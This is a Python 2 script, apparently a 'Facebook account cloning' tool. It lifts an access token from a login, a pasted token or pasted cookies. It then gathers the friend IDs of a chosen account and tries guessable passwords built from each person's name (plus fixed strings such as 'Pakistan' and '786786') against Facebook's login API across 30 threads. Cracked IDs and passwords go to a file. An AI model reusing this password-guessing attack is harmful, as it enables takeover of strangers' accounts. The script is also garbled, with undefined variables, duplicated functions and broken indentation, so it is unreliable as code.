#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To BabarAli
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[+] Token :")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()

def get(data):
	print '[*] Generate access token '

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print '[*] successfully generate access token'
		print '[*] Your access token is stored in cookie/token.log'
		menu()
	except KeyError:
		print '[!] Failed to generate access token'
		print '[!] Check your connection / email or password'
		os.remove('cookie/token.log')
		menu()
	except requests.exceptions.ConnectionError:
		print '[!] Failed to generate access token'
		print '[!] Connection error !!!'
		os.remove('cookie/token.log')
		menu()

def phone():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')		

#Dev:Hamayun-Khan
##### LOGO #####
logo = """
\033[1;94m  _   _    __    __  __    __    _  _  __  __  _  _ 
\033[1;97m ( )_( )  /__\  (  \/  )  /__\  ( \/ )(  )(  )( \( )
\033[1;96m  ) _ (  /(__)\  )    (  /(__)\  \  /  )(__)(  )  ( 
\033[1;94m (_) (_)(__)(__)(_/\/\_)(__)(__) (__) (______)(_)\_)

 \033[37;1m[\033[41;1m FACEBOOK ACCOUNT CLONING \033[00;1m\033[37;1m ]\n
 
 \033[32;1mCreator \033[37;1m: \033[33;1mHamayun Khan

 \033[32;1mFacebook \033[37;1m: \033[33;1mHamayun Khan
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;97m# 
\033[1;97m# 
\033[1;97m#  
\033[1;97m# 
  __ __   ____  ___ ___   ____  __ __  __ __  ____  
 |  T  T /    T|   T   T /    T|  T  T|  T  T|    \ 
 |  l  |Y  o  || _   _ |Y  o  ||  |  ||  |  ||  _  Y
 |  _  ||     ||  \_/  ||     ||  ~  ||  |  ||  |  |
 |  |  ||  _  ||   |   ||  _  |l___, ||  :  ||  |  |
 |  |  ||  |  ||   |   ||  |  ||     !l     ||  |  |
 l__j__jl__j__jl___j___jl__j__jl____/  \__,_jl__j__j
                                                    

 """
CorrectUsername = "abc"
CorrectPassword = "abc"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Username \x1b[1;91m: \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Ham-Khan
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;97mWrong Password"
            os.system('xdg-open https://www.facebook.com/ham143mah')
    else:
        print "\033[1;97mWrong Username"
        os.system('xdg-open https://www.facebook.com/ham143mah')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def log_menu():

    try:

        t_check = open('access_token.txt', 'r')

        menu()

    except (KeyError, IOError):

        os.system('clear')

        print logo

        print '\x1b[1;93m ~~~~ Login menu ~~~~\x1b[1;91m'

        print 47 * '-'

        print '\x1b[1;92m[1] Login with FaceBook'

        print '\x1b[1;92m[2] Login with token'

        print '\x1b[1;92m[3] Login with cookies'

        print ''

        log_menu_s()

def log_menu_s():

    s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Mr-Robot\xe2\x9e\xa4 ')

    if s == '1':

        log_fb()

    elif s == '2':

        log_token()

    elif s == '3':

        log_cookie()

    else:

        print ''

        print '\\ Select valid option '

        print ''

        log_menu_s()

def log_fb():

    os.system('clear')

    print logo

    print '\x1b[1;31;1mLogin with id/pass'

    print 47 * '-'

    lid = raw_input('\x1b[1;92m Id/mail/no: ')

    pwds = raw_input(' \x1b[1;93mPassword: ')

    try:

        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text

        q = json.loads(data)

        if 'loc' in q:

            ts = open('access_token.txt', 'w')

            ts.write(q['loc'])

            ts.close()

            menu()

        elif 'www.facebook.com' in q['error']:

            print ' User must verify account before login'

            raw_input('\x1b[1;92m Press enter to try again ')

            log_fb()

        else:

            print ' Id/Pass may be wrong'

            raw_input(' \x1b[1;92mPress enter to try again ')

            log_fb()

    except:

        print ''

        print 'Exiting tool'

        os.system('exit')

def log_token():

    os.system('clear')

    print logo

    print '\x1b[1;93mLogin with token\x1b[1;91m'

    print 47 * '-'

    tok = raw_input(' \x1b[1;92mPaste token here: \x1b[1;91m')

    print 47 * '-'

    t_s = open('access_token.txt', 'w')

    t_s.write(tok)

    t_s.close()

    menu()

def log_cookie():

    os.system('clear')

    print logo

    print ''

    print '\x1b[1;31;1mLogin Cookies'

    print ''

    try:

        cookie = raw_input(' Paste cookies here: ')

        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 

           'host': 'm.facebook.com', 

           'origin': 'https://m.facebook.com', 

           'upgrade-insecure-requests': '1', 

           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 

           'cache-control': 'max-age=0', 

           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 

           'content-type': 'text/html; charset=utf-8', 

           'cookie': cookie}

        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)

        c2 = re.search('(EAAA\\w+)', c1.text)

        hasil = c2.group(1)

        ok = open('access_token.txt', 'w')

        ok.write(hasil)

        ok.close()

        menu()

    except AttributeError:

        print ''

        print '\tInvalid cookies'

        print ''

        raw_input(' \x1b[1;92mPress enter to try again ')

        log_menu()

    except UnboundLocalError:

        print ''

        print '\tInvalid cookies'

        print ''

        raw_input(' \x1b[1;92mPress enter to try again ')

        log_menu()

    except requests.exceptions.SSLError:

        print ''

        print '\tInvalid cookies'

        print ''

        raw_input(' \x1b[1;92mPress enter to try again ')

        log_menu()

def menu():

    os.system('clear')

    try:

        token = open('access_token.txt', 'r').read()

    except (KeyError, IOError):

        print ''

        print logo

        print '\x1b[1;31;1mLogin FB id to continue'

        time.sleep(1)

        log_menu()

    try:

        r = requests.get('https://graph.facebook.com/me?access_token=' + token)

        q = json.loads(r.text)

        z = q['name']

    except (KeyError, IOError):

        print logo

        print ''

        print '\t Account Cheekpoint\x1b[0;97m'

        print ''

        os.system('rm -rf access_token.txt')

        time.sleep(1)

        log_menu()

    except requests.exceptions.ConnectionError:

        print logo

        print ''

        print '\t Turn on mobile data/wifi\x1b[0;97m'

        print ''

        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')

        menu()

	
	os.system("clear") #Dev:Hamayun_Khan
	print logo
	print "\033[1;37m[!]\033[1;97m Logged in User Information\033[1;92m"
	time.sleep(0.05)
	print "\033[1;37m[•]\033[1;91m Name\033[1;93m:\033[1;91m"+nama+"\033[1;93m               "
	time.sleep(0.05)
	print "\033[1;37m[•]\033[1;91m ID\033[1;93m:\033[1;91m"+id+"\x1b[1;93m              "
	time.sleep(0.05)
	print "\033[1;97m•-----------------\033[1;37mENJOY\033[1;97m-----------------•"
	print "\033[1;97m[1]\033[1;47m\033[1;31mStart Hacking                             \033[1;0m"
	time.sleep(0.05)
	print "\033[1;97m[2]\033[1;47m\033[1;31mID Not Found Problem                      \033[1;0m"
	time.sleep(0.05)
	print "\033[1;97m[3]\033[1;47m\033[1;31mRest/Update Tool                          \033[1;0m"
	time.sleep(0.05)
	print "\033[1;97m[0]\033[1;47m\033[1;31mExit                                      \033[1;0m"
	time.sleep(0.05)
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;31mSelect Option: \033[1;91m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
        elif unikers =="1":		
	        super()
	elif unikers =="2":
		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
	        menu()
	elif unikers =="3":
		os.system('clear')
		print logo
		print "\033[1;95m...............\033[1;91mDataReset\033[1;95m.................."
                jalan('\033[1;96m=10%')
                jalan("\033[1;96m==20%")
                jalan('\033[1;96m===30%')
                jalan('\033[1;96m====40%')
                jalan("\033[1;96m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;96m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;96m=========90%')
                jalan('\033[1;96m==========100%')
                jalan('\033[1;91mCloning Data Reset and update')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
	        menu()		
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
def pilih():
	unikers = raw_input("\n\033[1;91mChoose an Option: \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
	        menu()
	elif unikers =="3":
		os.system('clear')
		print logo
		print "\033[1;95m...............\033[1;91mDataReset\033[1;95m.................."
                jalan('\033[1;96m=10%')
                jalan("\033[1;96m==20%")
                jalan('\033[1;96m===30%')
                jalan('\033[1;96m====40%')
                jalan("\033[1;96m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;96m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;96m=========90%')
                jalan('\033[1;96m==========100%')
                jalan('\033[1;91mCloning Data Reset and update')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
	        menu()		
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m[1]\033[1;47m\033[1;91mClone From Friend List    \033[1;0m"
	time.sleep(0.05)
	print "\033[1;97m[2]\033[1;47m\033[1;91mClone From Public Account \033[1;0m"
	time.sleep(0.05)
	print "\033[1;97m[0]\033[1;47m\033[1;91mBack                     \033[1;0m"
	time.sleep(0.05)
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m[+]\033[1;91mSelect Option: \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print "\033[1;97m•-----------------\033[1;37mENJOY\033[1;97m-----------------•"
		print logo
		jalan('\033[1;97m[+]\033[1;91mGetting Accounts\033[1;97m:-:')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print "\033[1;97m•-----------------\033[1;37mENJOY\033[1;97m-----------------•"
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;91mEnter ID\033[1;97m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m[+]\033[1;91mName\033[1;97m:\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;97m[+]\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		print"\033[1;97m[+]\033[1;91mGetting Accounts\033[1;97m:-:"
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;97m[+]\033[1;91mTotal Accounts\033[1;97m: \033[1;97m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[+]\033[1;31mHacking Has Been Started\033[1;97m"+o),;sys.stdout.flush();time.sleep(0.05)
	print "\n\033[1;97m[+]\x1b[1;31mStop Process Press CTRL+Z"
	print "\033[1;97m•-----------------\033[1;37mENJOY\033[1;97m-----------------•"
 	
			
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Babar_Ali
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '1234'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;97m[!] \x1b[1;92m[OK]'											
				print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user											
				print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
				    print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b ['name']
				    print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				    print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;97m[!] \x1b[1;92m[OK]'											
				            print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				            print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user								
				            print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
				               print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;93m    : \x1b[1;97m' + b['name']
				               print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				               print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;97m[!] \x1b[1;92m[OK]'								
						       print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']									
						       print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user							
						       print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
				                           print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                           print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                           print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + 'khan'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;97m[!] \x1b[1;92m[OK]'											
				                                   print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				                                   print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user											
				                                   print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
				                                       print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                       print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                       print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = '786786'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;97m[!] \x1b[1;92m[OK]'						
						                               print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']							
						                               print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user					
						                               print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
				                                                   print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                   print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                                   print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = 'Pakistan'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;97m[!] \x1b[1;92m[OK]'											
				                                                           print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				                                                           print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user									
				                                                           print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
				                                                               print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                               print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                                               print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'12345'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;97m[!] \x1b[1;92m[OK]'					
									                               print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']					
									                               print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user				
									                               print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
				                                                                           print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                                           print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                                                           print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '786'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;97m[!] \x1b[1;92m[OK]'											
				                                                                                   print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				                                                                                   print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user										
				                                                                                   print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
				                                                                                       print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                                                       print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;98m      : \x1b[1;97m' + user
				                                                                                       print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '786'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;97m[!] \x1b[1;92m[OK]'			
											                                       print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']			
											                                       print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user	
											                                       print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
				                                                                                                   print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                                                                   print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                                                                                   print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
										
except:
  pass
    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[1;92mCrack Done'
    print '\x1b[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input('\x1b[1;93m Press enter to back')
    choice_crack()


if __name__ == '__main__':
    reg()


	

	

	

	

	

	
